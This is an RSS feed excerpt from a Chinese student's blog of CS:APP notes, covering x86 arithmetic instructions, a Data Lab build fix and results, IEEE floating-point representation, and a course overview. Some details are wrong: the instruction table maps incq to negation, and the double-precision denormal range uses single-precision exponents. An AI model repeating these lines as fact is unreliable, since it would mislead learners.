&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst += 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;decq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst -= 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;incq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst = -dst;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long arith (long x, long y, long z) {
	long t1 = x+y; 
	long t2 = z+t1; 
	long t3 = x+4; 
	long t4 = y * 48; 
	long t5 = t3 + t4; 
	long rval = t2 * t5; 
	return rval; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;arith: 
	leaq (%rdi,%rsi), %rax           # t1 
	addq %rdx, %rax                  # t2 
	leaq (%rsi,%rsi,2), %rdx 
	salq $4, %rdx                    # t4 
	leaq 4(%rdi,%rdx), %rcx          # t5 
	imulq %rcx, %rax                 # rval 
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我从数学物理世界跨进计算机世界,先是接触Python语言,后来学习C语言,到如今与汇编语言交手,回想起来真是心潮澎湃!一开始写Python代码,连简单的循环都要Debug好久,后来学习了C语言,相比起来觉得Python非常简单啊,如今接触汇编语言这样奇怪曲折的表达方式,突然觉得C语言根本就像英语一样自然了!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 16 Jan 2025 16:00:00 GMT</pubDate></item><item><title>Datalab</title><link>https://tankimzeg.top/blog/csapp/datalab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/datalab/</guid><description>Datalab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/datalab/&quot;&gt;https://tankimzeg.top/blog/csapp/datalab/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;这是第一个实验.我还没开始写呢,先在datalab-handout文件夹下一使用make构建,立即报错:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -O1 -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c
In file included from btest.c:16:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
   27 | #include &amp;lt;bits/libc-header-start.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
In file included from decl.c:1:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
   27 | #include &amp;lt;bits/libc-header-start.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
In file included from /usr/lib/gcc/x86_64-linux-gnu/12/include/limits.h:203,
                 from /usr/lib/gcc/x86_64-linux-gnu/12/include/syslimits.h:7,
                 from /usr/lib/gcc/x86_64-linux-gnu/12/include/limits.h:34,
                 from tests.c:3:
/usr/include/limits.h:26:10: fatal error: bits/libc-header-start.h: No such file or directory
   26 | #include &amp;lt;bits/libc-header-start.h&amp;gt;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
make: *** [Makefile:11: btest] Error 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;显然,这里缺少一个头文件.找到的解决办法是:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
sudo apt-get install gcc-multilib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每次修改后,运行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;make &amp;amp;&amp;amp; ./btest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;会自动检查结果是否正确.至于其他文件夹,目前不了解是什么用处,可以查看README文件&lt;/p&gt;
&lt;p&gt;我自己做了一下,真是疯狂!从没想过这些不用循环,控制语句的算法!也用上了一些逻辑学运算的知识才能勉强解决!&lt;/p&gt;
&lt;p&gt;网上的答案中,这份写的不错:
&lt;a href=&quot;https://zhuanlan.zhihu.com/p/472188244&quot;&gt;CSAPP | Lab1-Data Lab 深入解析 - 知乎&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;终于成功写完!非常有成就感!也让我意识到自己的不足.这个实验做了很久,可能有10小时.我感觉我的思维从来没有来到过这一层.看似简单的操作,需要考虑的情况非常繁杂.CMU不愧是名牌大学,教学质量真的狠,不是平庸之人能随意学会的.&lt;/p&gt;
&lt;p&gt;第一个实验就如此丰富,下个实验更是大名鼎鼎的bomblab,非常期待!&lt;/p&gt;
&lt;p&gt;最后欣赏一下全部pass的结果:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kim@MyDell:/mnt/e/Documents/C/CSAPP/datalab-handout$ make &amp;amp;&amp;amp; ./btest
gcc -O1 -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c
btest.c: In function ‘test_function’:
btest.c:334:23: warning: ‘arg_test_range’ may be used uninitialized [-Wmaybe-uninitialize ]
  334 |     if (arg_test_range[2] &amp;lt; 1)
      |         ~~~~~~~~~~~~~~^~~
btest.c:299:9: note: ‘arg_test_range’ declared here
  299 |     int arg_test_range[3]; /* test range for each argument */
      |         ^~~~~~~~~~~~~~
Score   Rating  Errors  Function
 1      1       0       bitXor
 1      1       0       tmin
 2      2       0       isTmax
 2      2       0       allOddBits
 2      2       0       negate
 3      3       0       isAsciiDigit
 3      3       0       conditional
 3      3       0       isLessOrEqual
 4      4       0       logicalNeg
 4      4       0       howManyBits
 4      4       0       float_twice
 4      4       0       float_i2f
 4      4       0       float_f2i
Total points: 37/37
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 14 Jan 2025 16:00:00 GMT</pubDate></item><item><title>浮点数</title><link>https://tankimzeg.top/blog/csapp/floating-point/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/floating-point/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/floating-point/&quot;&gt;https://tankimzeg.top/blog/csapp/floating-point/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;CS:APP     Page  75~87&lt;/p&gt;
&lt;h1&gt;背景:二进制的浮点数,分数&lt;/h1&gt;
&lt;p&gt;在计算机中,用二进制的浮点数表示实数
![](attachments/Pasted image%2020250115201705.png%20)
即
$$ \sum_{k=-j}^{i} b_{k} \times 2^k $$
例如
$$5 \frac{3}{4}=(101.11)&lt;em&gt;{2}$$
$$ 2 \frac{7}{8} = (10.111)&lt;/em&gt;{2}$$
$$ 1 \frac{7}{16} = (1.0111)&lt;em&gt;{2}$$
而
$$0.1111\dots&lt;/em&gt;{2} = \frac{1}{2}+\frac{1}{4}+\frac{1}{8}+\frac{1}{16}+\dots+\frac{1}{2^{n}}+\dots \to 1.0 $$&lt;/p&gt;
&lt;p&gt;有些小数则不能有有限位数表示,例如
$$ \frac{1}{3} = 0.010101[01]\dots_{2}$$
$$ \frac{1}{5} = 0.00110011[0011]\dots_{2}$$
$$ \frac{1}{10} = 0.000110011[0011]\dots_{2}$$
而在计算机中,存储位数是有限的.所以为了提高精度就需要减小整数部分的位数;为了增加整数部分的位数就需要降低精度.&lt;/p&gt;
&lt;h2&gt;二进制浮点数的科学计数法&lt;/h2&gt;
&lt;p&gt;$$(-1)^sM\cdot 2^E$$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;s是符号位(sign),决定了正负&lt;/li&gt;
&lt;li&gt;尾数(significand)的范围是[1.0,2.0)&lt;/li&gt;
&lt;li&gt;阶码E(exponent)会以2的E次幂扩大尾数&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;IEEE浮点数标准&lt;/h1&gt;
&lt;h2&gt;精度&lt;/h2&gt;
&lt;p&gt;两个IEEE标准:单精度和双精度:
![](attachments/Pasted image%2020250115203736.png%20)&lt;/p&gt;
&lt;h2&gt;情况1:规格化的值&lt;/h2&gt;
&lt;p&gt;上图中,
当阶码不全为0也不全为1的时候exp ≠ 000...0 并且exp ≠ 111...1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;阶码字段exp = E + bias&lt;ul&gt;
&lt;li&gt;阶码是unsigned类型&lt;/li&gt;
&lt;li&gt;偏移量bias = 2^{k-1} - 1,k是阶码位的位数:&lt;ul&gt;
&lt;li&gt;对于单精度是127(exp:1&lt;del&gt;254,E:-126&lt;/del&gt;127)&lt;/li&gt;
&lt;li&gt;对于双精度是1023(exp:1&lt;del&gt;2046,E:-1022&lt;/del&gt;1023)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;尾数的编码隐含了整数部分前导1:M=1.xxxx&lt;ul&gt;
&lt;li&gt;xxxx就是小数字段frac的比特&lt;/li&gt;
&lt;li&gt;M=1.0,小数字段是000...0;M=2-ε,小数字段是111...1&lt;/li&gt;
&lt;li&gt;这种方法获得了一个额外精度&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;举例&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;以浮点数15213.0为例
 &lt;code&gt;float F = 15213.0f;&lt;/code&gt;
 $$15213_{10} = 11101101101101_{2} = 1.1101101101101_{2}\times 2^{13}$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;过程
 $$M = 1.\underline{1101101101101}&lt;em&gt;{2} $$
 $$ frac = \underline{1101101101101} 0000000000&lt;/em&gt;{2}$$
 $$ E = 13$$
 $$ Bias = 127   $$
 $$ Exp = 140 = 10001100_{2} $$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;结果&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;0&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;10001100&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;11011011011010000000000&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;s&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;exp&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;frac&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;情况2:非规格化的值&lt;/h2&gt;
&lt;p&gt;当阶码域exp全为0(exp = 000...0)时,所表示的数是非规格化形式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;阶码的值E=1-Bias而不是-Bias&lt;/li&gt;
&lt;li&gt;尾数的编码隐含了整数部分前导0:M=0.xxxx&lt;ul&gt;
&lt;li&gt;xxxx就是小数字段frac的比特&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;exp = 000...0,frac = 000...0&lt;ul&gt;
&lt;li&gt;表示0&lt;/li&gt;
&lt;li&gt;对于+1和-1的符号位有+0.0和-0.0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;exp = 000...0,frac ≠ 000...0&lt;ul&gt;
&lt;li&gt;表示非常接近于0的数&lt;/li&gt;
&lt;li&gt;分布均匀地接近于0.0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;情况3:特殊值&lt;/h2&gt;
&lt;p&gt;当阶码域exp全为1(exp=111...1)的时候&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;frac=000...0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表示无穷∞(Infinity)&lt;/li&gt;
&lt;li&gt;能够表示溢出的结果&lt;/li&gt;
&lt;li&gt;当s=0时是+∞;当s=-1时是-∞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;frac≠000...0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表示不是一个数(NaN)&lt;/li&gt;
&lt;li&gt;能够表示运算结果不是实数或无穷,例如sqrt(-1),∞-∞,∞*0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;在数轴上的分布&lt;/h2&gt;
&lt;p&gt;![](attachments/Pasted image%2020250115235636.png%20)
规格化的值不是均匀分布的;非规格化的值聚集在0附近,并且是均匀分布的.&lt;/p&gt;
&lt;h2&gt;数字示例:以8位浮点格式为例&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;s&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;exp&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;frac&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1-bit&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;4-bit&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;3-bit&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;偏移量 Bias = 2^ (4-1) = 7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;![](attachments/Pasted image%2020250116000313.png%20)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;完整范围:&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250116001055.png&quot; alt=&quot;&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;在-1.0~1.0附近:&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250116001115.png&quot; alt=&quot;&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1&gt;浮点运算&lt;/h1&gt;
&lt;h2&gt;舍入(Round)&lt;/h2&gt;
&lt;h3&gt;基本思想&lt;/h3&gt;
&lt;p&gt;首先计算精确值,然后按需要的精度舍入&lt;/p&gt;
&lt;h3&gt;舍入方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;向0四舍五入&lt;/li&gt;
&lt;li&gt;向下(-∞)四舍五入&lt;/li&gt;
&lt;li&gt;向上(+∞)四舍五入&lt;/li&gt;
&lt;li&gt;四舍五入偶成双
  这是默认方式.即大于中间数(在十进制下是5,在二进制下是1)的向上入,小于中间数的向下舍,等于中间数的向偶数舍入.
  对于十进制:
  $$ Rou nd(7.8949999,2) = 7.89 $$
  $$ Rou nd(7.8950001,2) = 7.90 $$
  $$ Rou nd(7.8950000,2) = 7.90 $$
  $$ Rou nd(7.8850000,2) = 7.88 $$
  对于二进制也类似:
  $$Rou nd(10.00\ 011,2) = 10.00 $$
  $$Rou nd(10.00\ 110,2) = 10.01 $$
  $$Rou nd(10.11\ 100,2) = 11.00 $$
  $$Rou nd(10.10\ 100,2) = 10.10 $$&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;加法(addtion)&lt;/h2&gt;
&lt;p&gt;$$(-1)^{s_{1}} M_{1} 2^{E_{1}} + (-1)^{s_{2}} M_{2} 2^{E_{2}}$$
假设E1&amp;gt;E2
精确结果为
$$(-1)^{s} M\  2^{E} $$
其中:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;符号s由对齐后的符号决定.&lt;/li&gt;
&lt;li&gt;尾数M对齐后相加的结果&lt;/li&gt;
&lt;li&gt;指数E是E1
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250116175507.png&quot; alt=&quot;&quot;&gt;
调整:&lt;/li&gt;
&lt;li&gt;如果M&amp;gt;=2,右移M,然后E增加1&lt;/li&gt;
&lt;li&gt;如果M&amp;lt;1,左移k位,E减小k&lt;/li&gt;
&lt;li&gt;如果E溢出,溢出为无穷&lt;/li&gt;
&lt;li&gt;舍入M使得符合frac位精度要求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对齐那样的处理方法导致了一个特性,就是不符合加法结合律:
&lt;code&gt;(3.14+1e10)-1e10 = 0, 3.14+(1e10-1e10) = 3.14&lt;/code&gt;
符合加法交换律&lt;/p&gt;
&lt;h2&gt;乘法(multiplication)&lt;/h2&gt;
&lt;p&gt;$$(-1)^{s_{1}} M_{1} 2^{E_{1}} \times (-1)^{s_{2}} M_{2} 2^{E_{2}}$$
精确结果为
$$(-1)^{s} M\  2^{E} $$
其中:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;符号位s: s1^ s2&lt;/li&gt;
&lt;li&gt;尾数M:M1×M2&lt;/li&gt;
&lt;li&gt;指数E:E1+E2
调整:&lt;/li&gt;
&lt;li&gt;如果M&amp;gt;=2,右移M,然后E增加1&lt;/li&gt;
&lt;li&gt;如果E溢出,溢出为无穷&lt;/li&gt;
&lt;li&gt;舍入M使得符合frac位精度要求
类似于浮点数加法的特性,浮点数乘法可能不符合乘法结合律和乘法分配律
&lt;code&gt;(1e20*1e20)*1e-20 = inf, 1e20*(1e20*1e-20) = 1e20&lt;/code&gt;
&lt;code&gt;1e20*(1e20-1e20) = 0.0, 1e20*1e20-1e20*1e20 = NaN&lt;/code&gt;
不过,在大多数情况下,只要差距不是这么悬殊,不对inf和NaN实数运算,数学规律都是适用的.
可以保证对于
$$ a\geq b ;&amp;amp; ; c\geq 0 \Rightarrow a&lt;em&gt;c\geq b&lt;/em&gt;c$$
$$ a\geq b ;&amp;amp; ; c\leq 0 \Rightarrow a&lt;em&gt;c\leq b&lt;/em&gt;c$$
$$ a\ne NaN \Rightarrow a*a \geq 0$$&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;C语言中的浮点数&lt;/h1&gt;
&lt;p&gt;C语言提供了两种不同的浮点数:单精度float和双精度double
在int,float,double类型之间进行强制类型转换时.原则如下:
与signed和unsigned类型相互转换不会改变比特位不同的是,这里比特会发生实质性的改变&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;double/float -&amp;gt; int&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接截去小数部分&lt;/li&gt;
&lt;li&gt;向0舍入&lt;/li&gt;
&lt;li&gt;超过int范围或转换NaN时是未定义行为:通常置为TMin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;int/float -&amp;gt; double
  因为double有更大的范围,也有更大的精度,所以能够保证是精确值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;int -&amp;gt; float
  数字不会溢出,但是可能被舍入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;double -&amp;gt;float&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;因为float范围更小,所以可能溢出为+∞或-∞;因为精度更小,所以可能被舍入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;浮点数的范围&lt;/h2&gt;
&lt;p&gt;补充一下浮点数能够表示的范围&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单精度浮点数&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;格式&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;最小值&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;最大值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;规格化&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-126} $$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$2^{127} ×(2-2^ {-23})\approx 3.4\times 10^{38}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;非规格化&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-23}\times 2^{-126}=2^{-149}\approx 1.4 \times 10^{-45}$$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-126} ×(1-2^ {-23}) \approx 1.18\times_{1}0^{-38}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;双精度浮点数&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;格式&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;最小值&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;最大值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;规格化&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-1022} $$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$2^{1023} ×(2-2^ {-52})\approx  1.8\times 10^{308}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;非规格化&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-52}\times 2^{-1022}=2^{-1074} \approx 4.9\times 10^{-324} $$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-126} ×(1-2^ {-23})\approx 2.2\times 10^{-308}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 14 Jan 2025 16:00:00 GMT</pubDate></item><item><title>CS:APP课程概览</title><link>https://tankimzeg.top/blog/csapp/course-overview/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/course-overview/</guid><description>第一节课一般都是吹吹水🥱</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/course-overview/&quot;&gt;https://tankimzeg.top/blog/csapp/course-overview/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;课件:&lt;a href=&quot;https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html&quot;&gt;15-213: Introduction to Computer Systems / Schedule Fall 2015&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;视频:&lt;a href=&quot;https://www.bilibili.com/video/BV1iW411d7hd&quot;&gt;2015 CMU 15-213 CSAPP 深入理解计算机系统 课程视频&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;实验:&lt;a href=&quot;https://csapp.cs.cmu.edu/3e/labs.html&quot;&gt;CS:APP3e, Bryant and O&amp;#39;Hallaron&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;2015 CMU 15-213: Introduction to Computer Systems&lt;/h1&gt;
&lt;p&gt;Instructors: Randal E. Bryant and David R.O&amp;#39;Hallaron&lt;/p&gt;
&lt;p&gt;(深入理解计算机系统 CSAPP作者)&lt;/p&gt;
&lt;h2&gt;课程主题：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;大多数 CS 和 CE 课程都强调抽象&lt;ul&gt;
&lt;li&gt;抽象数据类型&lt;/li&gt;
&lt;li&gt;非典型分析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;这些抽象有其局限性&lt;ul&gt;
&lt;li&gt;特别是在存在错误的情况下&lt;/li&gt;
&lt;li&gt;需要了解底层实现的细节&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;学习本课程的有益成果&lt;ul&gt;
&lt;li&gt;成为更有效率的程序员&lt;ul&gt;
&lt;li&gt;能够有效地发现和消除bug&lt;/li&gt;
&lt;li&gt;能够理解并调整程序性能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;为以后学习 CS 和 ECE 的 &amp;quot;系统 &amp;quot;课程做准备&lt;ul&gt;
&lt;li&gt;编译器、操作系统、网络、计算机体系结构、&lt;/li&gt;
&lt;li&gt;嵌入式系统、存储系统等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;1:int 不是整数,float 不是实数&lt;/h2&gt;
&lt;p&gt;$$ x^2\ge0 $$
但是计算机中存在数值溢出的问题，不总是我们期望的行为
&lt;code&gt;print 50000*50000&lt;/code&gt;
输出-1794967296
而&lt;code&gt;print 1e20+(-1e20+3.14)&lt;/code&gt;
输出0
&lt;code&gt;print 1e20+-1e20+3.14&lt;/code&gt;
输出3.1400000000000001&lt;/p&gt;
&lt;h2&gt;计算机算术&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;不会产生随机数&lt;/li&gt;
&lt;li&gt;不能想当然认为它遵守一般的数学性质&lt;/li&gt;
&lt;li&gt;需要理解哪些情境下使用哪些抽象&lt;/li&gt;
&lt;li&gt;对编译器和严谨的应用程序员的重要话题&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;2:了解汇编&lt;/h2&gt;
&lt;h2&gt;3:内存很重要&lt;/h2&gt;
&lt;p&gt;随机存取存储器是一种非物理抽象概念&lt;/p&gt;
&lt;h2&gt;4:提升性能&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void copyij(int src[2048][2048], int dst[2048][2048]) 
{ 
	int i,j; 
	for (i = 0; i &amp;lt; 2048; i++) 
		for (j = 0; j &amp;lt; 2048; j++) 
			dst[i][j] = src[i][j]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;4.3ms&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void copyij(int src[2048][2048], int dst[2048][2048]) 
{ 
	int i,j; 
	for (j = 0; j &amp;lt; 2048; j++) 
		for (i = 0; i &amp;lt; 2048; i++) 
			dst[i][j] = src[i][j]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;81.8ms
这个分层存取的例子说明,性能取决于访问的方式&lt;/p&gt;
&lt;p&gt;为什么性能有差异?
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250113113958.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本书封面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;5:计算机不仅执行程序&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;I/O系统&lt;/li&gt;
&lt;li&gt;网络服务&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 13 Jan 2025 00:00:00 GMT</pubDate></item><item><title>比特,字节和整型</title><link>https://tankimzeg.top/blog/csapp/bits-bytes-integers/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/bits-bytes-integers/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/bits-bytes-integers/&quot;&gt;https://tankimzeg.top/blog/csapp/bits-bytes-integers/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;用bits表示信息&lt;/h1&gt;
&lt;p&gt;在计算机中,一切都是bits
每个bit是0或1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为什么采用bit?&lt;ul&gt;
&lt;li&gt;易于存储&lt;/li&gt;
&lt;li&gt;在噪声和电线中传输可靠.例如,可以预设高电压表示1,低电压表示0,相比于十进制分成10份,这样的抗干扰能力肯定更强&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数的二进制表示:
整数和浮点数的小数点左边是$2^0,2^1,2^2,...$&lt;br&gt;浮点数的小数点右边是$2^{-1},2^{-2},2^{-3},...$
这样依次展开.&lt;/p&gt;
&lt;h2&gt;字节&lt;/h2&gt;
&lt;p&gt;1byte = 8 bits
采用十六进制,一个字符相当于4 bits,所以一字节相当于2位十六进制数,从00到ff&lt;/p&gt;
&lt;h2&gt;c语言中的数据表示&lt;/h2&gt;
